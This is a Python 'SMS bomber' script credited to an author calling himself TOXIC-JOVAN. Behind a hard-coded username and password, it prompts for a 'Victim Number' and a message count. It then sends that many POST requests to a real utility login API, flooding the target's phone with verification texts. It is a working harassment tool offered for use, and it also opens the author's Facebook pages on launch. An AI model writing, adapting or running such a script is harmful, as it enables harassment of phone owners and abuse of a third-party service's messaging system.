import os,sys,time,datetime
import requests
bl="\33[94m"
re="\033[91m"
li="\033[94m"
w="\33[97m"
y="\33[93m"
g="\033[1;32m"
cy="\033[96m"
end="\033[0m"



os.system('clear')
info="""    ╔===================================================╗
    ║ [•] Author   => TOXIC-JOVAN                  ║
    ║ [•] Tool     => BD sms Bomber                     ║
    ║ [•] GitHub=https://www.github.com/Toxic-Jovan ║
    ║ [•] whatsapp= 01753706851            ║
    ╚===================================================╝
"""
os.system("xdg-open https://www.facebook.com/i.love.allah.its.jovan.vau?mibextid=ZbWKwL")
os.system("lolcat login.txt")
print(y+info)

name='TOXIC'
password='JOVAN'
usr=str(input(cy+"Username => "))
print("  ")
pas=str(input(g+"Password => "))

if name==usr and password==pas:
  print(g+"Login Successful ☑️")
  time.sleep(2)
  os.system('clear')
  
  pass 

else:
  print(re+"[×] Wrong Username or Password try agin ")
  os.system("xdg-open https://www.facebook.com/sylhet.gang.sg.official/?mibextid=ZbWKwL"),
  sys.exit()

 

logo="""
   
 ______  _____      ______              _     _             
(____  \(____ \    (____  \            | |   (_)            
 ____)  )_   \ \    ____)  ) ___  ____ | | _  _ ____   ____ 
|  __  (| |   | |  |  __  ( / _ \|    \| || \| |  _ \ / _  |
| |__)  ) |__/ /   | |__)  ) |_| | | | | |_) ) | | | ( ( | |
|______/|_____/    |______/ \___/|_|_|_|____/|_|_| |_|\_|| |
                                                     (_____|

                😈TOXIC - JOVAN😈
================================================================                                                      
"""
os.system("xdg-open https://www.facebook.com/i.love.allah.its.jovan.vau?mibextid=ZbWKwL")
print(cy+logo)

print(w+"["+re+" 1."+w+"]"+g+"START" " " +cy+"BOM"+li+"BING  ")
print(g)
print(w+"["+re+" 2."+w+"]"+w+"E"+g+"X"+re+"I"+cy+"T")

inp=str(input(g+"Enter"  +re+" Your"  +g+" Choice"+w+" => "))
if inp=="2":
        print("\n          ♥️♥️Thanks For Using My Tool♥️♥️"),
        os.system("xdg-open https://www.facebook.com/i.love.allah.its.jovan.vau?mibextid=ZbWKwL"),
        time.sleep(1),
        exit()
        
        

elif inp=='1':
  time.sleep(2)
  os.system('clear')
  print(cy+logo),
  
  number=str(input(g+"\n Enter your Victim Number"+cy+"(without"+w+" +88 ) => "))
  
  amount=int(input(g+"        Enter amount =>  "))
else:
  print (re+"\n • Invalid Choice• \n • Try again •"),
  exit()
  pass
  
url="http://nesco.sslwireless.com/api/v1/login"

data={'phone_number':number}
  
for i in range(amount):
  requests.post(url,data=data)
  
  print(str(i+1)+" TOXIC SmS-BOM Send Successfully ☑️")
